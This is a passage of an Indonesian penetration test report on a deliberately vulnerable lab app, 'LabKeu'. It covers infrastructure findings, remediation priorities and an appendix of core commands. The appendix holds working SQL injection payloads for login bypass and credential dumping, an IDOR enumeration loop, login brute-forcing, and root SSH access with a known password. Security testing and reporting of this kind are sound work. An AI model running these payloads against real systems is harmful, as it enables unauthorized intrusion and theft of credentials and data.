**Bukti. 15.1 MySQL ter-expos** — port 3307 dipetakan ke `0.0.0.0`, padahal komentar `docker-compose.yml` menyatakan "hanya localhost". Brute force 40 kombinasi menemukan `labkeu_user` / `labkeu_pass`, yang punya `ALL PRIVILEGES` pada skema `labkeu`. Kontrol aplikasi dilewati sepenuhnya.

**15.2 Privilege escalation lewat grup docker** — akun non-root `labkeu` adalah anggota grup `docker` yang punya akses baca-tulis ke `/var/run/docker.sock`:

```
uid=1000(labkeu) gid=1000(labkeu) groups=1000(labkeu),10(wheel),102(docker)
srw-rw---- 1 root docker 0 /var/run/docker.sock
```

Setiap anggota grup docker secara efektif **setara root** pada host. Tidak dieksekusi pada engagement ini karena root sudah diperoleh lewat jalur lain, tapi vektornya terbukti ada.

**15.3 SSH root dengan password lemah** — `PermitRootLogin yes` + `PasswordAuthentication yes` + password `labkeu123` yang berhasil ditebak dalam 7 detik. Diperparah F-06.

**15.4 Kedua container berjalan sebagai root** — `uid=0(root)` pada `labkeu-app` dan `labkeu-db`. Setiap RCE di aplikasi langsung berarti root di dalam container, dan lewat 15.2 berpotensi root di host.

**15.5 Secret bocor di artefak deployment** — `SESSION_SECRET`, `DB_PASSWORD`, `MYSQL_PASSWORD`, `MYSQL_ROOT_PASSWORD` ter-hardcode di `docker-compose.yml` dan terbaca sebagai environment variable di dalam container.

**Catatan akurasi.** Perintah `mysql -h 192.168.1.93 -P 3307 -u root -prootpass` menghasilkan
`ERROR 1045 (28000): Access denied`. Jadi kebocoran `MYSQL_ROOT_PASSWORD` **tidak** berujung pada akses root database. Yang berdampak adalah `labkeu_user` dengan `ALL PRIVILEGES`.

**Dampak.** Kelima kelainan di atas saling memperparah: database terbuka memberi akses data penuh tanpa melewati kontrol aplikasi; grup docker mengubah akun non-root menjadi setara root; SSH root lemah memberi jalur kedua menuju host; container yang berjalan sebagai root memperbesar radius ledakan setiap RCE; dan secret yang bocor membuat semua kredensial mudah dipulihkan.

**Perbaikan.** Bind database ke `127.0.0.1:3307`, hapus keanggotaan grup docker (`gpasswd -d labkeu docker`), set `PermitRootLogin no` + `PasswordAuthentication no` + `AllowUsers`, jalankan container sebagai user non-root, dan pindahkan seluruh secret ke file `.env` yang tidak di-commit dengan mode 600 — lalu rotasi nilai yang sudah terekspos.

---

## 6. Temuan Negatif — Yang Teruji Aman

Bagian ini penting untuk mencegah klaim berlebihan. Berikut pengujian yang **sudah dijalankan** dan hasilnya menunjukkan **tidak rentan**:

| Yang diuji | Hasil |
|---|---|
| Source code & backup terekspos lewat web? | 12 path sensitif (`.env`, `.git/config`, `server.js`, `Dockerfile`, `README.md`, `backup.zip`, …) → **semua 404** |
| Directory listing aktif? | `GET /uploads/` → 404. Tapi isi tetap bisa diambil bila nama ditebak (F-12) |
| `npm audit` | **found 0 vulnerabilities** — semua temuan dari kode sendiri, bukan CVE library |
| Path traversal di filename upload? | **GAGAL**, diverifikasi di disk. Multer menyaring `../` |
| SQLi di `/login` portal? | **Aman** — sudah parameterized query. Hanya `/login-noportal` yang rentan (F-01) |
| Pesan error ter-escape? | **Ya** — semua view pakai `<%= error %>`; hanya `search.ejs` yang `<%-` (F-11) |
| SSRF atau command injection? | **Tidak ada** — nol endpoint yang me-fetch URL dari user, nol `child_process`/`exec` dengan input user |
| Root MySQL terjangkau dari jaringan? | **Tidak** — `ERROR 1045: Access denied` (F-15.5) |
| Forgot-password membocorkan keberadaan akun? | **Tidak** — respons identik apa pun status akun |

---

## 7. Koreksi atas Laporan Sebelumnya

Enam koreksi faktual yang memisahkan laporan ini dari laporan lama:

| # | Klaim lama | Kenyataan | Tindakan |
|---|---|---|---|
| 1 | Target `192.168.1.18` | IP itu mati, target di `192.168.1.93` (MAC sama) | Evidence diambil ulang |
| 2 | Bukti listener pakai `ss -ltn` | `ss` tidak ada di host Alpine (`sh: ss: not found`) — evidence tidak reproducible | Diganti `netstat -ltnp` |
| 3 | Respons IDOR kosong = 22 byte | Sebenarnya `[]` = **2 byte**. Heuristik lama salah | Diganti hitung kemunculan field `perusahaan_id` |
| 4 | "Pembersihan jejak" selesai | **False.** 4 akun uji & 22 baris dokumen masih ada, `/uploads/passwd` live & publik | Dilaporkan sebagai F-12 |
| 5 | Self-register `perusahaan` langsung bisa akses data | Akun tsb `perusahaan_id=NULL`, dashboard **kosong**. Akses data baru jalan lewat IDOR | Nuansa ditulis di F-03 |
| 6 | Dump kredensial lewat kolom `password` | Teknik rapuh (batas `GROUP_CONCAT` + escaping) | Diganti subquery ke `nama_lengkap` |

---

## 8. Rekomendasi Berdasarkan Prioritas

### Segera (≤ 7 hari)

1. **F-01** — parameterisasi query di kedua endpoint login. Satu perubahan, memutus jalur terpendek.
2. **F-02** — hapus kredensial demo dari template, rotasi password yang terekspos.
3. **F-15.3 dan F-15.5** — matikan `PermitRootLogin yes`, wajibkan kunci SSH, pindahkan secret ke environment variable, rotasi nilai yang bocor.
4. **F-12** — bersihkan direktori upload dan tabel dokumen beserta akun uji tersisa.

### Jangka pendek (≤ 30 hari)

5. **F-04** — bandingkan `perusahaan_id` dari session dengan nilai dari URL.
6. **F-03** — hapus `account_type` dari body request, tetapkan di server.
7. **F-06** — rate limiting berlapis + account lockout dengan jendela meningkat.
8. **F-05** — whitelist ekstensi, validasi magic bytes, simpan di luar webroot, sajikan sebagai attachment.
9. **F-07** — secret dari environment variable (min. 32 byte), flag `HttpOnly`/`Secure`, perbaiki logout dengan `session.destroy()`.

### Jangka menengah (≤ 90 hari)

10. **F-08** — migrasi ke bcrypt work factor 12, lalu rotasi sekali.
11. **F-09** — TLS di reverse proxy + HSTS, hentikan HTTP langsung.
12. **F-13** — pasang `helmet` dengan CSP ketat, `frame-ancestors: none`, `nosniff`.
13. **F-10 dan F-11** — token CSRF sinkron; ganti `<%- %>` menjadi `<%= %>`.
14. **F-14** — pesan galat generik di `/register`.
15. **F-15.1, 15.2, 15.4** — bind DB ke loopback, hapus grup docker, container non-root.

### Proses berkelanjutan

- **SAST + DAST sebagai gerbang build.** SAST wajib memblokir build bila terdeteksi penggabungan string di klausa SQL atau pemakaian output template tanpa escaping.
- **Gate pemindaian secret di repositori** agar kredensial yang masuk ke kode tertangkap sebelum commit.
- **Prosedur cleanup wajib di akhir setiap engagement**, diautomasi.
- **Penilaian ulang** setelah tiap fase perbaikan, untuk memastikan tidak ada regresi.

---

## 9. Kesimpulan

Aplikasi LabKeu memiliki risiko **KRITIS**. Dari titik nol, penyerang mencapai root penuh dan akses database penuh dalam ~4 menit.

Tiga kelemahan struktural menjadi penyebab mendasar dan perlu ditangani menyeluruh:

1. **Tidak ada pemisahan batas kepercayaan** antara input pengguna dan query database (F-01).
2. **Tidak ada pemeriksaan kepemilikan objek** pada API, sehingga isolasi antar tenant tidak berjalan (F-04).
3. **Secret dikelola sebagai string hard-coded** di dalam kode dan artefak deployment (F-02, F-07, F-15), sehingga kredensial berubah dari rahasia menjadi informasi publik.

Urutan yang direkomendasikan: **F-01 dulu** (dampaknya paling besar, paling cepat dihentikan), lalu **F-02** (penutupannya hanya menghapus teks dari template), lalu **F-06 dan F-15** (menutup jalur akses root), lalu **F-04** (memulihkan isolasi data). F-08 dan F-09 memerlukan perubahan lebih besar (hash password, TLS) dan bisa dijadwalkan berikutnya — tapi keduanya adalah prasyarat agar kerentanan lain tidak bisa dieksploitasi berulang kali.

---

## 10. Catatan Otorisasi

Seluruh pengujian dilakukan pada **lab internal yang sengaja dibuat rentan dan terisolasi**. Dikonfirmasi dari README repositori target: *"HANYA untuk lab lokal/isolated, jangan pernah di-deploy ke internet"* dan *"Aplikasi ini untuk latihan menemukan, bukan contekan langsung"*. Data dan instansi fiktif, bukan GEMATI/BBGTK asli.

Tidak ada data produksi tersentuh, tidak ada denial-of-service disengaja, tidak ada payload merusak. Semua file uji dibuat dari konten dummy dan dihapus kembali.

**Perintah di dokumen ini hanya boleh dijalankan pada sistem yang Anda miliki atau yang telah mendapat izin tertulis untuk diuji.**

---

## Lampiran — Perintah Inti

```bash
# 1. Cari target (MAC, jangan nebak IP)
nmap -sn -n -T4 --min-rate 1000 192.168.1.0/24
#   -> 192.168.1.93  MAC 08:00:27:81:9D:8D

# 2. Port & versi
nmap -Pn -p- --min-rate 3000 -T4 192.168.1.93
nmap -Pn -sV -sC -p 22,3000,3307 192.168.1.93

# 3. Kredensial bocor di halaman publik
curl -s http://192.168.1.93:3000/login | grep -oE 'Contoh akun:.*'

# 4. Login
curl -s -c /tmp/cj -o /dev/null -X POST http://192.168.1.93:3000/login \
  -d 'username=individu1&password=password123'

# 5. IDOR: iterasi ID perusahaan
for id in 1 2 3 4 5 6 7 8 9 10; do
  printf "  /api/perusahaan/%-3s -> " "$id"
  curl -s -o /tmp/r -w 'HTTP=%{http_code} bytes=%{size_download} ' \
    -b /tmp/cj "http://192.168.1.93:3000/api/perusahaan/$id/data-keuangan"
  echo "baris=$(grep -o '\"perusahaan_id\"' /tmp/r | wc -l)"
done

# 6. SQLi: auth bypass
curl -s -c /tmp/cj_sqli -o /dev/null \
  -X POST http://192.168.1.93:3000/login-noportal \
  --data-urlencode "username=x' UNION SELECT 1,'h','x','perusahaan','BlackHat',1-- -" \
  --data-urlencode 'password=x'

# 7. SQLi: dump kredensial
P="x' UNION SELECT 1,'probe','x','perusahaan',(SELECT GROUP_CONCAT(
  CONCAT(id,':',username,'/',password,'/',account_type) ORDER BY id SEPARATOR ' | ')
  FROM users),1-- -"
curl -s -c /tmp/cj_s2 -o /dev/null -X POST http://192.168.1.93:3000/login-noportal \
  --data-urlencode "username=$P" --data-urlencode 'password=x'
curl -s -b /tmp/cj_s2 http://192.168.1.93:3000/dashboard \
  | grep -oE 'Masuk sebagai: <strong>[^<]*</strong>'

# 8. Rate limit: 100 percobaan gagal
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} " -X POST http://192.168.1.93:3000/login-noportal \
    -d "username=user_a&password=WRONG_$i"
done | tr ' ' '\n' | sort | uniq -c

# 9. Sesi zombie: cookie tetap sah setelah logout
curl -s -b /tmp/cj -c /tmp/cj -o /dev/null -X POST http://192.168.1.93:3000/logout
curl -s -b /tmp/cj -o /dev/null -w "reuse -> %{http_code} -> %{redirect_url}\n" \
  http://192.168.1.93:3000/dashboard

# 10. /uploads/passwd live
curl -s http://192.168.1.93:3000/uploads/passwd | head -5

# 11. Password plaintext di DB
sshpass -p 'labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.93 \
  "docker exec labkeu-db mysql -ulabkeu_user -plabkeu_pass labkeu -e \
   'SELECT id,username,password FROM users LIMIT 3;' 2>/dev/null"

# 12. Source & backup TIDAK terekspos (harus 404 semua)
for p in .env .git/config package.json server.js routes/auth.js \
         routes/dashboard.js db/db.js Dockerfile README.md backup.zip \
         app.bak node_modules/.package-lock.json; do
  printf "  %-34s %s\n" "$p" \
    "$(curl -s -o /dev/null -w '%{http_code}' "http://192.168.1.93:3000/$p")"
done

# 13. Root MySQL tidak terjangkau (harus GAGAL)
mysql -h 192.168.1.93 -P 3307 -u root -prootpass --skip-ssl -e "SELECT 1"
#   -> ERROR 1045 (28000): Access denied
```

---

**Skor CVSS dihitung dengan rumus resmi FIRST v3.1, bukan estimasi manual.** Karena itu beberapa skor berbeda dari tabel yang beredar luas: F-03 = **8.2** (bukan 8.1), F-09 = **8.1**, F-10 = **7.1** (bukan 6.3). Aritmetika lengkap per temuan tersedia di Lampiran A dokumen `.docx`.
